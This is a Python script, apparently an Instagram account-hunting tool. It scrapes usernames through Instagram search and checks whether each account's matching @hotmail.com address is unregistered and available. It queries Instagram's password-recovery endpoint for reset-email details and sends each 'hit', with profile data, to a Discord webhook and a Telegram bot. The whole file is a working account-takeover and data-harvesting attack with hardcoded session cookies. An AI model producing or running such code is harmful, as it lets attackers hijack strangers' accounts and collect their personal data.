import Topython
import requests
import sys
import os
import threading
import random
import rich

WEBHOOK_URL = 'WebHooooook'
# Renk kodları
R, X, F, C, B, K, V = '\033[1;31;40m', '\033[1;33;40m', '\033[1;32;40m', "\033[1;97;40m", '\033[1;36;40m', '\033[1;35;40m', '\033[1;36;40m'

class Checker:
    def __init__(self):
        self.token = input(f'• {B}TOKEN{C} ♪ {V}TELE : {K}')
        self.id = input(f'• {B}ID{C} ♪ {V}TELE : {K}')                       
        self.good_ig = 0
        self.bad_ig = 0
        self.good_hot = 0
        self.bad_hot = 0
        os.system('clear')
        requests.post(
            f"https://api.telegram.org/bot{self.token}/sendvideo?chat_id={self.id}&parse_mode=MarkdownV2&video=https://t.me/tehlikeliadam/31&caption="
            + str("Yanak")
        )

    def check_insta(self, email=None):
        response = Topython.Instagram.CheckEmail(f"{email}@hotmail.com")
        if response:
            self.good_ig += 1
            self.check_gmail(email=email)
        else:
            self.bad_ig += 1

    def check_gmail(self, email=None):
        try:
            response = Topython.Email.hotmail(email=email)
            if response:
                self.good_hot += 1
                self.informations(username=email)
            else:
                self.bad_hot += 1
        except Exception as e:
            if "network" in str(e):
                print("Use Vpn")
            else:
                self.gen_users()

    def informations(self, username=None):
        info = Topython.Instagram.information(username=username)
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': '009f03b18280bb343b0862d663f31ac80c5fb30dfae9e273e43c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            'User-Agent': 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            'Cookie': 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
        data = {
            'signed_body': '0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","adid":"0dfaf820-2748-4634-9365-c3d8c8011256","guid":"1f784431-2663-4db9-b624-86bd9ce1d084","device_id":"android-b93ddb37e983481c","query":"'+username+'"}',
            'ig_sig_key_version': '4',
        }    
        try:
            response = requests.post('https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/', headers=headers, data=data)
            rest = response.json().get('email', None)
            profile_link = f"https://www.instagram.com/{username}/"
        except Exception as e:
            print(f"Error: {e}")
            rest = None

        name = info['name']
        username = info['username']
        followers = info['followers']
        following = info['following']
        date = info['date']
        Id = info['id']
        post = info['post']
        bio = info['bio']
        colors = random.choice([R, X, F, B, K, V])
        hunt = (f"""
New Hunt Bro Good Luck  
Name : {name}
Username : {username}
Email : {username}@hotmail.com
Followers : {followers}
Following : {following}
Id : {Id}
Date : {date}
Posts : {post}
Reset : {rest}
Profile Link : {profile_link}
BY : @Noodix
        """)
        try:
            send_to_discord(hunt)
            Hit = rich.panel.Panel(hunt);rich.print(rich.panel.Panel(Hit, title=f"Instagram | {self.good_hot}"))
        except:
            self.informations(username=username)
    def run(self, email):
        self.check_insta(email)
        sys.stdout.write(f"\r  {C}Good Hotmail : {F}{self.good_hot} {C} , Bad IG : {R}{self.bad_ig} {C} , Good IG : {X}{self.good_ig}  {C}, Bad Hotmail : {R}{self.bad_hot} \r")
        sys.stdout.flush()        

    def gen_users(self):
        Lett = [
"一右雨円王音下火花学気九休金空月見五口校左三山子四時出女小上森人水正生青夕石先早草足村大男中虫町天田土二日入年白八百文木本名目立力林六",
"アィイゥウェエォオカガキギクグケゲコゴサザシジスズセゼソゾタダチヂッツヅテデトドナニヌネノハバパヒビピフブプヘベペホボポマミムメモャヤュユョヨラリルレロヮワヰヱヲンヴヵヶ",
"あぃいぅうぇえぉおかがきぎくぐけげこごさざしじすずせぜそぞただちぢっつづてでとどなにぬねのはばぱひびぴふぶぷへべぺほぼぽまみむめもゃやゅゆょよらりるれろゎわゐゑをん",
"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
"абвгдеёжзийклмнопрстуфхцчшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЦЧШЩЪЫЬЭЮЯ",
        "پچژکگابتثجحخدذرزسشصضطظعغفقكلمنهوي",
        ]

        while True:
                name = random.choice(Lett)
                key = ''.join(random.choice(name) for _ in range(random.randint(2,4)))
                date = random.choice(["2010","2011","2012","2013"])
                keyword = key + date
                headers = {
                    'accept': '*/*',
                    'accept-language': 'en-US,en;q=0.9',
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://www.instagram.com',
                    'referer': 'https://www.instagram.com/',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
                    'x-fb-friendly-name': 'PolarisSearchBoxRefetchableDirectQuery',
                }
                data = {
                    'fb_api_caller_class': 'RelayModern',
                    'fb_api_req_friendly_name': 'PolarisSearchBoxRefetchableDirectQuery',
                    'variables': '{"data":{"context":"blended","include_reel":"true","query":"'+str(keyword)+'","rank_token":"","search_surface":"web_top_search"},"hasQuery":true}',
                    'server_timestamps': 'true',
                    'doc_id': '7778489908879212',
                }
                try:
                    response = requests.post('https://www.instagram.com/graphql/query', cookies=None, headers=headers, data=data).json()['data']['xdt_api__v1__fbsearch__topsearch_connection']['users']
                    
                    for user in response:
                        email = user['user']['username']
                        if "_" not in email and len(email) > 5:
                            self.run(email)
                except:
                    self.gen_users()
def send_to_discord(content):
    data = {
        'content': content
    }
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        response.raise_for_status()
    except requests.RequestException as e:
        print(f"Failed to send to Discord: {e}")

if __name__ == "__main__":
    checker = Checker()
    for _ in range(25):
        threading.Thread(target=checker.gen_users).start()